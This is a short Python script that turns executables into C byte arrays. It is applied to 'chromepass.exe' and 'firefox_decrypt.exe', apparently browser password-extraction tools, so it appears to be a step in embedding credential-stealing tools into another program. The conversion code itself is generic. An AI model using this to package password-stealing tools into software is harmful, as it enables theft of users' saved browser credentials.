def exe_to_c_array(filename, array_name):
    with open(filename, 'rb') as f:
        data = f.read()
    with open(f"{array_name}.h", 'w') as f:
        f.write(f"unsigned char {array_name}[] = {{\n")
        for i, byte in enumerate(data):
            f.write(f"0x{byte:02x}, ")
            if (i + 1) % 12 == 0:
                f.write("\n")
        f.write("\n};\n")
        f.write(f"unsigned int {array_name}_len = {len(data)};\n")

exe_to_c_array("chromepass.exe", "chromepass")
exe_to_c_array("firefox_decrypt.exe", "firefox_decrypt")
